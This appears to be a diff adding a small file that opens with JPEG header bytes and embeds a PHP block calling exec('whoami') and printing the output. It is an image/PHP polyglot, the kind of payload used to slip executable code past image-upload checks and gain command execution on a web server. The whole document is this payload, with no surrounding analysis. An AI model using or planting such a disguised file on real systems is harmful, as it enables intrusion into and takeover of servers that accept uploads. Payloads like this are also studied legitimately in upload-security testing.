@@ -1,0 +1,2 @@
+ÿØÿàJFIFÿþ+<?php $o=null;$r=null;exec('whoami', $o, $r); print_r($o)?>ÿÛC		
+
